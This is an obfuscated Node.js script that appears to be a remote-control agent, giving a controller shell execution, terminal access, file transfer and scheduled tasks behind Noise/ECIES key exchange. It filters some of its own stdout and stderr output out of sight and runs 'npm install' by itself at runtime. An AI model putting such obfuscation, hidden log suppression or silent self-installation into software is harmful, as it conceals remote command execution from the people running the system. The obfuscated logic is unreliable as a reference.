#!/usr/bin/env node
const a0cm = a0b;
(function (a, b) {
    const cl = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(cl(0x2e5)) / 0x1 + parseInt(cl(0x7c8)) / 0x2 + parseInt(cl(0x35f)) / 0x3 * (-parseInt(cl(0xcec)) / 0x4) + parseInt(cl(0xcda)) / 0x5 * (parseInt(cl(0xcbc)) / 0x6) + parseInt(cl(0xaa8)) / 0x7 + -parseInt(cl(0x72c)) / 0x8 * (-parseInt(cl(0x246)) / 0x9) + -parseInt(cl(0x6f5)) / 0xa;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xeb34b));
const a0c = [
    a0cm(0x57e),
    a0cm(0xc40),
    a0cm(0xd12)
];
function a0d(a) {
    const cn = a0cm, b = {
            'cgwOO': cn(0x13e),
            'ADERu': function (c) {
                return c();
            }
        };
    return function (c, d, f) {
        const co = cn, g = c[co(0x7a0)]();
        if (a0c['some'](h => g[co(0x134)](h))) {
            if (typeof f === b[co(0x644)])
                b['ADERu'](f);
            return !![];
        }
        return a[co(0x1a7)](this, arguments);
    };
}
process['stdout'][a0cm(0x10b)] = a0d(process['stdout'][a0cm(0x10b)]), process[a0cm(0x1ad)][a0cm(0x10b)] = a0d(process['stderr'][a0cm(0x10b)]);
const a0f = require('express'), a0g = require(a0cm(0x6c5)), a0h = require(a0cm(0x959)), a0i = require(a0cm(0xcd2)), a0j = require('tls'), a0k = require(a0cm(0x7c9)), a0l = require('fs'), a0m = require('fs')['promises'], a0n = require(a0cm(0x65a)), a0o = require('path'), a0p = require('os'), a0q = require('readline'), {
        exec: a0r,
        spawn: a0s
    } = require(a0cm(0x57b)), a0t = require(a0cm(0xd2b)), a0u = require(a0cm(0x8ee)), {encrypt: a0v} = require(a0cm(0x6f0)), a0w = require(a0cm(0x9f5)), a0x = require(a0cm(0xa1e)), a0y = require(a0cm(0x33f));
function a0z() {
    const cp = a0cm, a = {
            'pHNnl': cp(0xbf6),
            'GdDGp': cp(0x7d9),
            'kdLiH': cp(0x98f),
            'uLDdA': function (b, c) {
                return b <= c;
            },
            'acqIt': function (b, c) {
                return b + c;
            },
            'KKYbt': function (b, c) {
                return b >= c;
            },
            'UXnTi': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o['join'](__dirname, a['pHNnl']);
        if (!a0l['existsSync'](b))
            return;
        for (let c of a0l[cp(0x357)](b, a[cp(0x805)])[cp(0xb0c)](/\r?\n/)) {
            let d = c[cp(0x58a)]();
            if (!d || d[cp(0x830)]('#'))
                continue;
            if (d[cp(0x830)](a[cp(0x8dc)]))
                d = d[cp(0x2d5)](0x7)[cp(0x29f)]();
            const f = d[cp(0x1eb)]('=');
            if (a[cp(0xbd2)](f, 0x0))
                continue;
            const g = d[cp(0x2d5)](0x0, f)['trim']();
            let h = d[cp(0x2d5)](a[cp(0xcba)](f, 0x1))[cp(0x58a)]();
            a[cp(0x737)](h[cp(0x55c)], 0x2) && (h[cp(0x830)]('\x22') && h[cp(0xb13)]('\x22') || h[cp(0x830)]('\x27') && h[cp(0xb13)]('\x27')) && (h = h[cp(0x2d5)](0x1, -0x1));
            if (g && !a[cp(0x460)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C = null, a0D = null, a0E = null, a0F = ![];
const a0G = '1.1.2';
function a0H() {
    const cq = a0cm, a = {
            'rdAdU': cq(0xd85),
            'VpZaP': cq(0xd97),
            'FySgO': 'musl'
        };
    if (process[cq(0x267)] !== a['rdAdU'])
        return null;
    try {
        const b = process[cq(0xbbd)][cq(0x515)]();
        if (b[cq(0x405)] && b['header'][cq(0x1b2)])
            return a[cq(0x4db)];
        if ((b['sharedObjects'] || [])[cq(0x758)](c => /(?:ld-musl|libc\.musl)/[cq(0xdb7)](String(c))))
            return a['FySgO'];
    } catch (c) {
    }
    return null;
}
function a0I(a) {
    const cr = a0cm, b = {
            'jBEBd': function (d) {
                return d();
            },
            'BGPaO': function (d, f) {
                return d === f;
            },
            'vVERh': cr(0xaba),
            'hDhoZ': cr(0xcc4),
            'TCWtF': '@qwqo/node-pty'
        }, c = a !== undefined ? a : b[cr(0x549)](a0H);
    if (b[cr(0x31f)](c, b[cr(0x72e)]))
        return [
            cr(0xacb),
            b[cr(0x86f)]
        ];
    return [
        '@lydell/node-pty',
        b[cr(0x4ac)]
    ];
}
const a0J = [
    'const\x20pty\x20=\x20require(process.env.KISAMA_PTY_PROBE_PATH);',
    a0cm(0xd17),
    'const\x20args\x20=\x20process.platform\x20===\x20\x22win32\x22\x20?\x20[\x22/d\x22,\x20\x22/c\x22,\x20\x22exit\x22]\x20:\x20[\x22-c\x22,\x20\x22exit\x200\x22];',
    a0cm(0x71f),
    a0cm(0x68d),
    a0cm(0x1af),
    a0cm(0x209)
][a0cm(0x455)]('\x0a');
function a0K(a) {
    const cs = a0cm, b = {
            'Udqjd': function (c, d) {
                return c(d);
            },
            'FvhGH': function (c, d) {
                return c(d);
            },
            'CJweI': function (c, d) {
                return c === d;
            },
            'mNJDu': function (c, d, f) {
                return c(d, f);
            },
            'oqFSQ': cs(0x4ad),
            'mTMxa': function (c, d) {
                return c(d);
            },
            'SJQrR': function (c, d) {
                return c(d);
            },
            'ueDxV': function (c, d, f, g) {
                return c(d, f, g);
            },
            'OZLln': cs(0x702),
            'PWRfu': function (c, d, f) {
                return c(d, f);
            },
            'QwHfa': cs(0xaa0),
            'RPoxT': cs(0x744)
        };
    return new Promise(c => {
        const cw = cs, d = {
                'tzYfm': function (l, m) {
                    const ct = a0b;
                    return b[ct(0x871)](l, m);
                },
                'Zojpx': function (l, m, n) {
                    const cu = a0b;
                    return b[cu(0x328)](l, m, n);
                },
                'uHLkx': function (l, m) {
                    const cv = a0b;
                    return b[cv(0x991)](l, m);
                }
            };
        let f;
        try {
            f = require[cw(0x48d)](a);
        } catch (l) {
            b[cw(0x991)](c, {
                'ok': ![],
                'detail': cw(0x7a6) + b[cw(0x991)](String, l['message'])[cw(0xb0c)]('\x0a')[0x0]
            });
            return;
        }
        const g = b['ueDxV'](a0s, process[cw(0x374)], [
            '-e',
            a0J
        ], {
            'cwd': a0p['tmpdir'](),
            'env': {
                ...process.env,
                'KISAMA_PTY_PROBE_PATH': f
            },
            'stdio': [
                b[cw(0xbc5)],
                b['OZLln'],
                cw(0x15b)
            ]
        });
        let h = '';
        if (g[cw(0x1ad)])
            g[cw(0x1ad)]['on']('data', m => {
                const cx = cw;
                h += d[cx(0x2b9)](String, m);
                if (h[cx(0x55c)] > 0x7d0)
                    h = h[cx(0x2d5)](-0x7d0);
            });
        let i = ![];
        const j = (m, n) => {
                const cy = cw;
                !i && (i = !![], b[cy(0x2d2)](c, {
                    'ok': m,
                    'detail': n
                }));
            }, k = b[cw(0x962)](setTimeout, () => {
                const cz = cw;
                try {
                    g[cz(0x713)]();
                } catch (m) {
                }
                d[cz(0xd15)](j, ![], '探测超时');
            }, 0x3a98);
        g['on'](b[cw(0x85e)], m => {
            const cA = cw;
            d[cA(0xcc5)](clearTimeout, k), j(![], cA(0x4f7) + m[cA(0xbe8)]);
        }), g['on'](b[cw(0x3a7)], (m, n) => {
            const cB = cw;
            b[cB(0xc96)](clearTimeout, k);
            if (b[cB(0xcfb)](m, 0x0))
                b[cB(0x328)](j, !![], 'ok');
            else
                b[cB(0x328)](j, ![], cB(0xb73) + m + '\x20signal=' + n + (h ? b[cB(0x68f)] + h[cB(0x58a)]()[cB(0xb0c)]('\x0a')[cB(0x3a6)]() : ''));
        });
    });
}
function a0L() {
    const cC = a0cm;
    return process[cC(0xa1b)][0x1] && a0o[cC(0xbfd)](a0o['resolve'](process[cC(0xa1b)][0x1])) || process[cC(0x733)]();
}
function a0M(a) {
    const cD = a0cm, b = {
            'hFKwl': function (j, k) {
                return j(k);
            },
            'ouvko': function (j, k) {
                return j(k);
            },
            'glGne': function (j, k) {
                return j(k);
            },
            'eFbwU': function (j, k) {
                return j(k);
            },
            'lrryp': function (j, k) {
                return j !== k;
            },
            'HxsJM': cD(0xaba),
            'tWFjt': cD(0xd97),
            'pmhRk': cD(0xb21),
            'AKmJJ': function (j, k) {
                return j(k);
            },
            'vWLiS': '--no-save\x20--no-audit\x20--no-fund\x20--fetch-retries=1\x20--fetch-retry-maxtimeout=5000\x20--fetch-timeout=20000'
        };
    if (a0F)
        return Promise[cD(0x48d)](![]);
    a0F = !![];
    const c = a0H();
    if (b[cD(0xbb1)](c, b['HxsJM']) && b[cD(0xbb1)](c, b[cD(0xc37)]))
        return Promise['resolve'](![]);
    const d = cD(0x8be) + process[cD(0x6e1)] + '-' + c, f = d + '@' + a0G, g = a0L();
    if (!a0l[cD(0xc25)](a0o['join'](g, b[cD(0x832)])))
        return b[cD(0xb11)](a, 'npm\x20自愈跳过:\x20' + g + '\x20无\x20package.json'), Promise[cD(0x48d)](![]);
    const h = cD(0xa50) + a0G, i = b[cD(0xa2e)];
    return b['AKmJJ'](a, '尝试\x20npm\x20自愈补装:\x20npm\x20install\x20' + h + '\x20' + f + cD(0x2e9) + g + ')'), new Promise(j => {
        const cH = cD, k = {
                'txvmd': function (l, m) {
                    const cE = a0b;
                    return b[cE(0xca4)](l, m);
                },
                'gZhyq': function (l, m) {
                    const cF = a0b;
                    return b[cF(0x674)](l, m);
                },
                'RzbiH': function (l, m) {
                    return b['glGne'](l, m);
                },
                'ZaxOU': function (l, m) {
                    const cG = a0b;
                    return b[cG(0x396)](l, m);
                }
            };
        a0r(cH(0x920) + h + '\x20' + f + '\x20' + i, {
            'cwd': g,
            'timeout': 0x15f90
        }, l => {
            const cI = cH;
            if (l) {
                k['txvmd'](a, cI(0x88a) + String(l['message'])['split']('\x0a')[0x0]), k[cI(0xd3d)](j, ![]);
                return;
            }
            k['RzbiH'](a, cI(0x5fb) + h + '\x20+\x20' + f), k[cI(0x4cd)](j, !![]);
        });
    });
}
async function a0N(a) {
    const cJ = a0cm, b = {
            'PbFZk': function (d) {
                return d();
            },
            'nBIYh': cJ(0x61c),
            'YxyOq': cJ(0xa02),
            'XVccC': cJ(0x462),
            'GeGTa': 'node-pty',
            'nDwgV': cJ(0xb21),
            'zzYYM': function (d, f) {
                return d(f);
            },
            'UQSgi': function (d, f) {
                return d(f);
            },
            'bDBAE': function (d, f) {
                return d + f;
            },
            'ByzJA': cJ(0x833),
            'IyDVP': function (d, f) {
                return d(f);
            }
        }, c = b[cJ(0x4fb)](a0I);
    for (const d of c) {
        if (d[cJ(0x830)](b['nBIYh'])) {
            const h = a0L(), i = a0o[cJ(0x455)](h, b[cJ(0x801)], b[cJ(0x99b)], b[cJ(0xc3c)], cJ(0xb21));
            if (a0l[cJ(0xc25)](i)) {
                const j = a0H(), k = j ? a0o[cJ(0x455)](h, 'node_modules', b[cJ(0x99b)], cJ(0x17b) + process[cJ(0x6e1)] + '-' + j, b[cJ(0xc62)]) : null;
                if (j && k && !a0l[cJ(0xc25)](k)) {
                    b[cJ(0xae8)](a, cJ(0x6e4) + j + '\x20二进制包\x20(npm\x20engines\x20门槛静默跳过),\x20预检自愈补装');
                    if (!await a0M(a)) {
                        b[cJ(0xae8)](a, 'pty\x20候选\x20' + d + cJ(0x46b));
                        continue;
                    }
                }
            }
        }
        let f = null;
        try {
            f = require(d);
        } catch (l) {
            b[cJ(0x478)](a, cJ(0x380) + d + cJ(0x7b9) + (l && l[cJ(0xa2f)] ? b[cJ(0xcd1)](l[cJ(0xa2f)], '\x20') : '') + String(l && l[cJ(0xbe8)])[cJ(0xb0c)]('\x0a')[0x0]);
            continue;
        }
        const g = await a0K(d);
        if (g['ok'])
            return b[cJ(0xae8)](a, cJ(0x178) + d + cJ(0x2f2) + (b[cJ(0x4fb)](a0H) || b['ByzJA']) + ')'), {
                'name': d,
                'mod': f
            };
        b['IyDVP'](a, cJ(0x380) + d + cJ(0x6be) + g['detail']);
    }
    return null;
}
function a0O() {
    const cK = a0cm, a = {
            'LcvVo': function (b, c) {
                return b + c;
            },
            'KWiiF': '所有\x20pty\x20实现均不可用\x20(子进程探测失败)。',
            'ZZGYR': function (b) {
                return b();
            },
            'wZfqE': '\x20(musl\x20环境需\x20node\x20>=\x2020.19\x20支持\x20require(esm));\x20@lydell\x20预编译二进制不兼容\x20musl'
        };
    if (a0C || a0D)
        return Promise[cK(0x48d)](a0C);
    return !a0E && (a0E = a0N(b => {
        const cL = cK;
        try {
            a0P[cL(0xd42)]('[PTY]\x20' + b);
        } catch (c) {
            console[cL(0x305)](a[cL(0xd92)](cL(0x914), b));
        }
    })[cK(0x896)](b => {
        const cM = cK;
        return b ? a0C = b[cM(0x44a)] : a0D = a[cM(0xd92)](a[cM(0x1c5)] + (cM(0x4ca) + process[cM(0x6e1)] + '-' + (a[cM(0x829)](a0H) || cM(0x71e)) + '@' + a0G + '\x20--no-save'), a[cM(0x259)]), a0C;
    })), a0E;
}
if (typeof Bun !== a0cm(0x3c7))
    try {
        a0C = require(a0cm(0x488));
    } catch (a0cj) {
        a0D = '核心终端依赖\x20(bun-pty)\x20加载失败:\x20' + a0cj[a0cm(0xbe8)];
    }
else {
    if (process['platform'] !== a0cm(0xd85))
        try {
            a0C = require(a0cm(0xcc4));
        } catch (a0ck) {
            a0D = a0cm(0x173) + a0ck['message'] + a0cm(0xa60);
        }
}
const a0P = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const cN = a0cm, a = {
                'NXxNg': function (b, c) {
                    return b !== c;
                },
                'UjmPa': cN(0x3c7)
            };
        return a[cN(0x321)](typeof a0a1, a[cN(0x199)]) && a0a1[cN(0xc51)] !== undefined ? a0a1[cN(0xc51)] : 0x2;
    },
    'debug': a => {
        const cO = a0cm, b = {
                'saovf': function (c, d) {
                    return c <= d;
                }
            };
        b[cO(0x141)](a0P[cO(0x242)], a0P[cO(0xb7f)][cO(0x79a)]) && console[cO(0x305)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const cP = a0cm;
        a0P[cP(0x242)] <= a0P[cP(0xb7f)]['INFO'] && console['log']('\x1b[36m[INFO]\x1b[0m\x20' + a);
    },
    'warn': a => {
        const cQ = a0cm, b = {
                'QrkNG': function (c, d) {
                    return c <= d;
                }
            };
        b['QrkNG'](a0P[cQ(0x242)], a0P[cQ(0xb7f)][cQ(0xb8a)]) && console[cQ(0x305)](cQ(0x6ae) + a);
    },
    'error': a => {
        const cR = a0cm;
        a0P[cR(0x242)] <= a0P[cR(0xb7f)][cR(0x107)] && console['log'](cR(0x4dc) + a);
    }
};
function a0Q() {
    const cS = a0cm, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p[cS(0xa93)](),
            process['cwd']()
        ];
    for (const b of a) {
        if (b && a0l[cS(0xc25)](b) && a0l['statSync'](b)[cS(0x5fc)]())
            return b;
    }
    return process[cS(0x733)]();
}
function a0R() {
    const cT = a0cm;
    let a = null;
    try {
        a = a0p['homedir']();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[cT(0xc25)](d) && a0l[cT(0xc6d)](d)[cT(0x5fc)]())
            return d;
        if (d)
            console['log']('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20候选目录不存在,\x20已跳过:\x20' + d);
    }
    return console[cT(0x305)](cT(0x193) + process[cT(0x733)]()), process[cT(0x733)]();
}
class a0S {
    constructor(a = 'ok') {
        const cU = a0cm;
        this[cU(0xaa2)] = a;
    }
}
class a0T extends a0S {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0U extends a0S {
    constructor() {
        const cV = a0cm;
        super(), this[cV(0x6e1)] = '', this[cV(0xb9b)] = 0x0, this[cV(0xd82)] = '', this[cV(0x5a1)] = 0x0, this['gpu_name'] = '', this[cV(0x663)] = null, this[cV(0x37f)] = null, this[cV(0xcee)] = 0x0, this['os'] = '', this[cV(0xaaf)] = '', this[cV(0x5a4)] = 0x0, this[cV(0xa49)] = a0a1[cV(0x67d)], this[cV(0x92f)] = '', this['marks'] = [], this[cV(0x8a3)] = '', this[cV(0x8ce)] = null;
    }
}
class a0V extends a0S {
    constructor() {
        const cW = a0cm;
        super(), this['cpu'] = { 'usage': 0x0 }, this[cW(0x8d0)] = {
            'total': 0x0,
            'used': 0x0
        }, this[cW(0x952)] = {
            'total': 0x0,
            'used': 0x0
        }, this[cW(0x612)] = {
            'load1': 0x0,
            'load5': 0x0,
            'load15': 0x0
        }, this[cW(0xb1f)] = {
            'total': 0x0,
            'used': 0x0
        }, this['network'] = {
            'up': 0x0,
            'down': 0x0,
            'totalUp': 0x0,
            'totalDown': 0x0
        }, this[cW(0xbf1)] = {
            'tcp': 0x0,
            'udp': 0x0
        }, this[cW(0x1cb)] = 0x0, this[cW(0x1b6)] = 0x0, this['message'] = '';
    }
}
class a0W extends a0S {
    constructor() {
        const cX = a0cm, a = { 'UAAAg': cX(0xd90) }, b = a[cX(0x59c)][cX(0xb0c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[cX(0x563)] = ![];
                continue;
            case '1':
                super();
                continue;
            case '2':
                this['result'] = '';
                continue;
            case '3':
                this[cX(0xcb0)] = 0x0;
                continue;
            case '4':
                this[cX(0x3b4)] = '';
                continue;
            }
            break;
        }
    }
}
class a0X {
    constructor() {
        const cY = a0cm;
        this['name'] = '', this[cY(0xa3d)] = '', this[cY(0x483)] = '', this['size'] = 0x0, this[cY(0x970)] = '', this['mode'] = '', this[cY(0x972)] = '', this[cY(0xd9a)] = '';
    }
}
class a0Y {
    constructor() {
        const cZ = a0cm, a = { 'HMjrs': '6|1|7|2|5|4|0|3' }, b = a['HMjrs'][cZ(0xb0c)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[cZ(0x139)] = ![];
                continue;
            case '1':
                this[cZ(0xbc6)] = '';
                continue;
            case '2':
                this[cZ(0x972)] = '';
                continue;
            case '3':
                this['executable'] = ![];
                continue;
            case '4':
                this[cZ(0x486)] = ![];
                continue;
            case '5':
                this[cZ(0x483)] = '';
                continue;
            case '6':
                this[cZ(0xa3d)] = '';
                continue;
            case '7':
                this[cZ(0x87c)] = '';
                continue;
            }
            break;
        }
    }
}
class a0Z extends a0S {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0a0 {
    static ['_generateRawKeypair']() {
        const d0 = a0cm, a = {
                'wYKSo': 'x25519',
                'sVhSr': d0(0xbf0),
                'Jhtnu': d0(0x93b),
                'VMkPB': function (i, j) {
                    return i !== j;
                },
                'SFqFZ': d0(0x5bd)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[d0(0x47a)](a[d0(0x802)]), d = b[d0(0x82a)]({ 'format': a[d0(0xc6c)] }), f = c['export']({ 'format': a[d0(0xc6c)] }), g = Buffer['from'](d['d'], a[d0(0xc38)]), h = Buffer[d0(0x1e7)](f['x'], a['Jhtnu']);
        return (a[d0(0x96e)](g[d0(0x55c)], 0x20) || a[d0(0x96e)](h['length'], 0x20)) && a0P[d0(0xaa0)]('[🚨\x20严重警告]\x20X25519\x20密钥长度非\x2032\x20字节，Noise\x20协议必定崩溃！'), {
            'private_b64': g['toString'](a['SFqFZ']),
            'public_b64': h[d0(0x7a0)](a['SFqFZ'])
        };
    }
    static [a0cm(0x333)](a) {
        const d1 = a0cm, b = this[d1(0x284)]();
        return {
            'role': a,
            'private_b64': b[d1(0x50c)],
            'public_b64': b[d1(0xc4c)]
        };
    }
    static [a0cm(0xb33)](a = a0cm(0x424), b = a0cm(0x38f)) {
        const d2 = a0cm, c = {
                'control': this[d2(0x333)](a),
                'agent': this[d2(0x333)](b)
            };
        return c;
    }
}
class a0a1 {
    static [a0cm(0x6de)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static ['EXEC_SHELL_MODE'] = (process.env.EXEC_SHELL || a0cm(0x9ac))[a0cm(0x426)]() === a0cm(0x9ac);
    static [a0cm(0x79a)] = (process.env.DEBUG || a0cm(0x99a))[a0cm(0x426)]() === a0cm(0x9ac);
    static [a0cm(0x3e0)] = parseInt(process.env.TIMESTAMP_WINDOW || a0cm(0xa5f));
    static ['LOG_LEVEL'] = parseInt(process.env.LOG_LEVEL || (this[a0cm(0x79a)] ? '0' : '3'), 0xa);
    static [a0cm(0x750)] = a0a1[a0cm(0x4e2)](a0cm(0x5aa), a0cm(0x8b1)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0a1['_getConfigValue'](a0cm(0x5d0), a0cm(0x9c3)) || 'ECIES公钥内容';
    static [a0cm(0x6a3)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0cm(0x8a7)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0cm(0xc09), 0xa);
    static ['FILE_ROOT'] = a0R();
    static [a0cm(0xa58)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0cm(0x8eb));
    static [a0cm(0x9a3)] = (process.env.FOLLOW_SYMLINKS || a0cm(0x99a))[a0cm(0x426)]() === a0cm(0x9ac);
    static [a0cm(0x29d)] = Number['isFinite'](parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0cm(0x846), 0xa)) ? parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0cm(0x846), 0xa) : 0x400000;
    static [a0cm(0xcbd)] = (process.env.FILE_AUDIT_LOG || a0cm(0x9ac))['toLowerCase']() === a0cm(0x9ac);
    static [a0cm(0x910)] = !![];
    static [a0cm(0x31d)] = [];
    static ['crontasks'] = {};
    static [a0cm(0x963)] = ![];
    static [a0cm(0x4f0)] = parseInt(process.env.TASK_TIMEOUT || a0cm(0x3be));
    static [a0cm(0x6d8)] = parseInt(process.env.CRON_INTERVAL || '30');
    static ['onetimetasks_log'] = [];
    static [a0cm(0x3f7)] = [];
    static [a0cm(0x3d9)] = parseInt(process.env.MAX_TASK_LOG || a0cm(0xa15));
    static [a0cm(0x4e8)] = process.env.HOST || a0cm(0x156);
    static [a0cm(0x759)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0cm(0xda4));
    static [a0cm(0xd88)] = ((() => {
        const d3 = a0cm, a = {
                'VwPJK': function (c, d) {
                    return c || d;
                }
            }, b = (process.env.KMODE || '0')[d3(0x58a)]();
        return /^2q(?:uic)?$/i[d3(0xdb7)](b) ? '2' : a[d3(0x4a4)](b, '0');
    })());
    static [a0cm(0x7d3)] = /^2q(?:uic)?$/i[a0cm(0xdb7)]((process.env.KMODE || '')[a0cm(0x58a)]());
    static ['KNAME'] = (process.env.KNAME || '')[a0cm(0x58a)]();
    static ['KNAME_KEY'] = (process.env.KNAME_KEY || '')[a0cm(0x58a)]();
    static [a0cm(0xa3e)] = process.env.KPATH || '';
    static ['DNS_MODE'] = (process.env.KISAMA_DNS || a0cm(0x116))['trim']()['toLowerCase']();
    static [a0cm(0xb99)] = (process.env.KISAMA_DOH_SERVERS || '')[a0cm(0x58a)]();
    static [a0cm(0xa12)] = [
        a0cm(0xa9b),
        a0cm(0xd22),
        a0cm(0x7dc)
    ];
    static [a0cm(0x67d)] = process.env.AGENT_VERSION || a0cm(0xcb2);
    static [a0cm(0x238)] = a0k[a0cm(0x395)](0x20)[a0cm(0x7a0)](a0cm(0x5bd));
    static [a0cm(0x619)] = a0a0[a0cm(0xb33)]();
    static [a0cm(0x353)]() {
        const d4 = a0cm, a = {
                'sjRoc': d4(0x5bc),
                'JcqcW': d4(0x5bd),
                'kqBbN': d4(0xc7d)
            };
        return a0k[d4(0x5d4)](a['sjRoc'], Buffer[d4(0x1e7)](this['SESSION_KEY'], a[d4(0x2c4)]))['update'](a['kqBbN'])[d4(0x2f9)](a[d4(0x2c4)]);
    }
    static [a0cm(0xcad)]() {
        const d5 = a0cm, a = {
                'cypnb': d5(0x5bd),
                'BkYpw': '🔄\x20[SECURITY]\x20临时密钥过期,\x20已轮换\x20SESSION_KEY\x20与控制端\x20Noise\x20密钥对\x20(合法控制端需重新认证获取\x20baseinfo\x20新密钥)'
            }, b = a0a0[d5(0xb33)]();
        this[d5(0x619)][d5(0x10f)] = b[d5(0x10f)], this[d5(0x397)][d5(0x6b9)][d5(0x6aa)] = b['control'][d5(0x50c)], this[d5(0x238)] = a0k[d5(0x395)](0x20)[d5(0x7a0)](a[d5(0x1d1)]), this[d5(0x81f)] = null, this[d5(0xc08)] = 0x0, a0P['warn'](a[d5(0x683)]);
    }
    static [a0cm(0x397)] = {
        'controller': { 'private': this[a0cm(0x619)][a0cm(0x10f)][a0cm(0x50c)] },
        'agent': { 'public': this[a0cm(0x619)][a0cm(0x4df)][a0cm(0xc4c)] }
    };
    static [a0cm(0x2f8)] = 0xe10;
    static [a0cm(0x504)] = 0x1e;
    static ['BASEINFO_FAIL_BACKOFF'] = 0x3c;
    static ['STATUS_CACHE_TTL'] = 0x1e;
    static [a0cm(0x68a)] = null;
    static [a0cm(0x7b3)] = null;
    static ['_baseinfo_local_cache'] = null;
    static [a0cm(0xa94)] = 0x0;
    static [a0cm(0x346)] = 0x0;
    static ['_baseinfo_local_promise'] = null;
    static ['_baseinfo_net_cache'] = null;
    static [a0cm(0x983)] = 0x0;
    static [a0cm(0x85d)] = 0x0;
    static [a0cm(0x562)] = null;
    static [a0cm(0x81f)] = null;
    static [a0cm(0xc08)] = 0x0;
    static ['_status_fetch_promise'] = null;
    static ['_baseInfoNowMs']() {
        const d6 = a0cm, a = {
                'XoDNh': function (b, c) {
                    return b / c;
                }
            };
        return Number(a['XoDNh'](process[d6(0x5f7)][d6(0x3c4)](), 0xf4240n));
    }
    static [a0cm(0xdb3)](a) {
        return a ? { ...a } : null;
    }
    static async [a0cm(0xaa1)]() {
        const d7 = a0cm;
        if (this['_baseinfo_p_cache'])
            return this[d7(0xdb3)](this['_baseinfo_p_cache']);
        return !this[d7(0x7b3)] && (this[d7(0x7b3)] = new a0ac()['collectStaticInfo']()[d7(0xd7b)](a => {
            const d8 = d7;
            return a0P[d8(0x3a5)](d8(0x54c) + a[d8(0xbe8)], 0x1), a0ac[d8(0x791)]();
        })['then'](a => {
            const d9 = d7;
            return this[d9(0x68a)] = a, a;
        })[d7(0x4a1)](() => {
            const da = d7;
            this[da(0x7b3)] = null;
        })), this['_cloneBaseInfoPart'](await this['_baseinfo_p_promise']);
    }
    static async [a0cm(0x715)](a) {
        const db = a0cm, b = {
                'cIMWx': function (d, f) {
                    return d * f;
                },
                'hRTim': function (d, f) {
                    return d < f;
                }
            }, c = this['_baseInfoNowMs']();
        if (this[db(0x39d)] && c - this[db(0xa94)] < b[db(0x123)](this[db(0x504)], 0x3e8))
            return this[db(0xdb3)](this[db(0x39d)]);
        if (this['_baseinfo_local_fail_time'] && b[db(0x8e8)](c - this[db(0x346)], b[db(0x123)](this[db(0xd5f)], 0x3e8)))
            return this[db(0xdb3)](this[db(0x39d)] || a0ac['localFallback']());
        return !this[db(0x11b)] && (this[db(0x11b)] = new a0ac()[db(0xcc9)](a)['then'](d => {
            const dc = db;
            return this[dc(0x39d)] = d, this['_baseinfo_local_time'] = this[dc(0x22c)](), this[dc(0x346)] = 0x0, d;
        })[db(0xd7b)](d => {
            const dd = db;
            return a0P[dd(0x3a5)]('BaseInfo\x20local\x20组探测失败,\x20沿用上次成功值:\x20' + d['message'], 0x1), this[dd(0x346)] = this[dd(0x22c)](), this[dd(0x39d)] || a0ac[dd(0xcf1)]();
        })[db(0x4a1)](() => {
            const de = db;
            this[de(0x11b)] = null;
        })), this[db(0xdb3)](await this['_baseinfo_local_promise']);
    }
    static async [a0cm(0x807)]() {
        const df = a0cm, a = {
                'zbruG': function (c, d) {
                    return c < d;
                },
                'nFfzq': function (c, d) {
                    return c - d;
                },
                'ZMlBi': function (c, d) {
                    return c * d;
                },
                'KxmPK': function (c, d) {
                    return c * d;
                }
            }, b = this['_baseInfoNowMs']();
        if (this[df(0x53a)] && a[df(0x3dc)](a[df(0x27f)](b, this[df(0x983)]), a[df(0x97a)](this[df(0x2f8)], 0x3e8)))
            return this[df(0xdb3)](this[df(0x53a)]);
        if (this[df(0x85d)] && b - this[df(0x85d)] < a[df(0x7f0)](this[df(0xd5f)], 0x3e8))
            return this[df(0xdb3)](this[df(0x53a)] || a0ac[df(0x755)]());
        return !this[df(0x562)] && (this[df(0x562)] = new a0ac()[df(0xc87)]()['then'](c => {
            const dg = df;
            return this['_baseinfo_net_cache'] = c, this['_baseinfo_net_time'] = this[dg(0x22c)](), this[dg(0x85d)] = 0x0, c;
        })['catch'](c => {
            const dh = df;
            return a0P[dh(0x3a5)](dh(0x5ae) + c['message'], 0x1), this[dh(0x85d)] = this[dh(0x22c)](), this[dh(0x53a)] || a0ac[dh(0x755)]();
        })[df(0x4a1)](() => {
            const di = df;
            this[di(0x562)] = null;
        })), this[df(0xdb3)](await this['_baseinfo_net_promise']);
    }
    static [a0cm(0x4e2)](a, b) {
        const dj = a0cm, c = { 'Blubq': dj(0x7d9) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[dj(0x455)](__dirname, b);
        if (a0l[dj(0xc25)](f))
            try {
                return a0l[dj(0x357)](f, c[dj(0xa0c)])[dj(0x58a)]();
            } catch (g) {
            }
        return '';
    }
    static [a0cm(0x4da)]() {
        const dk = a0cm, a = {
                'QmHse': 'ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在',
                'yNGrX': function (b, c) {
                    return b > c;
                },
                'ILDDV': dk(0x58f),
                'OhnOx': dk(0x720),
                'VzyXM': dk(0x5c8),
